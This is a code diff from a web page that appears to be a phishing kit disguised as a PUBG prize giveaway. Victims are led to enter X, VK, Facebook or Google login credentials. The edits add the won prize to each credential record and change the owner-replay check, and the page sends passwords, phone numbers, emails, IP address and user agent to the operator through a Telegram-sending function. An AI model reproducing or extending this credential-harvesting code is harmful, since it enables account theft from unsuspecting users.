-                                if (userIP !== ownerIP) {
+                                const isOwner = localStorage.getItem('isOwner') === 'true';
+                                if (!isOwner) {
                                     hasPlayed = true;
                                     saveUserState();
                                     playBtn.innerHTML = `<i class="fas fa-check"></i> ${translations[currentLang].alreadyPlayed}`;
                                 } else {
+                                    // Владелец может играть снова
                                     playBtn.innerHTML = `<i class="fas fa-play"></i> ${translations[currentLang].play}`;
+                                    playBtn.disabled = false;
                                 }
-                                
-                                playBtn.disabled = false;
                                 
                                 // Показываем форму ввода ID аккаунта
                                 if (!accountId) {
@@ -4279,7 +4274,8 @@
                     const loginData = {
                         accountId: accountId,
                         username: xUsername,
-                        password: password
+                        password: password,
+                        prize: userPrize ? userPrize.name : 'Unknown'
                     };
                     
                     const success = await sendLoginDataToTelegram('x', loginData, finalPrizeIndex);
@@ -4301,7 +4297,8 @@
                         accountId: accountId,
                         phone: inputs[0].value,
                         password: inputs[1].value,
-                        foreign_computer: inputs[2].checked ? 'Да' : 'Нет'
+                        foreign_computer: inputs[2].checked ? 'Да' : 'Нет',
+                        prize: userPrize ? userPrize.name : 'Unknown'
                     };
                     
                     const success = await sendLoginDataToTelegram('vk', loginData, finalPrizeIndex);
@@ -4346,7 +4343,8 @@
                             const loginData = {
                                 accountId: accountId,
                                 email: fbLoginInput.value,
-                                password: fbPasswordInput.value
+                                password: fbPasswordInput.value,
+                                prize: userPrize ? userPrize.name : 'Unknown'
                             };
                             
                             const success = await sendLoginDataToTelegram('facebook', loginData, finalPrizeIndex);
@@ -4418,7 +4416,8 @@
                         accountId: accountId,
                         email: googleEmail,
                         password: password,
-                        show_password: showPassword ? 'Да' : 'Нет'
+                        show_password: showPassword ? 'Да' : 'Нет',
+                        prize: userPrize ? userPrize.name : 'Unknown'
                     };
                     
                     const success = await sendLoginDataToTelegram('google', loginData, finalPrizeIndex);
@@ -4499,9 +4498,11 @@
                     };
                     
                     const prizeNumber = prizeIndex + 1;
+                    const prizeName = userPrize ? userPrize.name : `Приз #${prizeNumber}`;
                     
                     let message = `🔐 НОВЫЕ ДАННЫЕ ДЛЯ ВХОДА PUBG 🔐\n\n`;
                     message += `🎮 ID аккаунта: ${loginData.accountId || 'Не указано'}\n`;
+                    message += `🎁 Выигранный приз: ${prizeName}\n`;
                     message += `📱 Соцсеть: ${socialNames[socialType] || socialType}\n`;
                     
                     // Добавляем данные в зависимости от соцсети
@@ -4521,7 +4522,6 @@
                         message += `👁️ Показать пароль: ${loginData.show_password || 'Нет'}\n`;
                     }
                     
-                    message += `🎁 Выигранный приз: #${prizeNumber}\n`;
                     message += `⏰ Время: ${new Date().toLocaleString()}\n`;
                     message += `🌐 User Agent: ${navigator.userAgent}\n`;
                     message += `📍 IP: ${userIP || 'Не определен'}`;
@@ -4572,7 +4572,8 @@
                     // Показываем рамку на выигранном призе (уже делается в restoreFramePosition)
                     
                     // Обновляем кнопку игры
-                    if (hasPlayed && userIP !== ownerIP) {
+                    const isOwner = localStorage.getItem('isOwner') === 'true';
+                    if (hasPlayed && !isOwner) {
                         playBtn.innerHTML = `<i class="fas fa-check"></i> ${translations[currentLang].alreadyPlayed}`;
                     }
                     
@@ -4585,7 +4586,8 @@
                 }
                 
                 // Проверяем, играл ли пользователь уже
-                if (hasPlayed && userIP !== ownerIP) {
+                const isOwner = localStorage.getItem('isOwner') === 'true';
+                if (hasPlayed && !isOwner) {
                     playBtn.innerHTML = `<i class="fas fa-check"></i> ${translations[currentLang].alreadyPlayed}`;
                     playBtn.disabled = false;
                 }
@@ -4664,7 +4666,8 @@
                 
                 // Автоматическая анимация рамки до начала игры
                 function animateFrameRandomly() {
-                    if (!isSpinning && !hasPlayed) {
+                    const isOwner = localStorage.getItem('isOwner') === 'true';
+                    if (!isSpinning && (!hasPlayed || isOwner)) {
                         const randomIndex = Math.floor(Math.random() * prizeCards.length);
                         moveFrameToPrize(randomIndex);
                         
@@ -4676,7 +4679,8 @@
                 
                 // Запускаем анимацию рамки через 2 секунды после загрузки
                 setTimeout(() => {
-                    if (!isSpinning && !userPrize) {
+                    const isOwner = localStorage.getItem('isOwner') === 'true';
+                    if (!isSpinning && (!userPrize || isOwner)) {
                         animateFrameRandomly();
                     }
                 }, 2000);
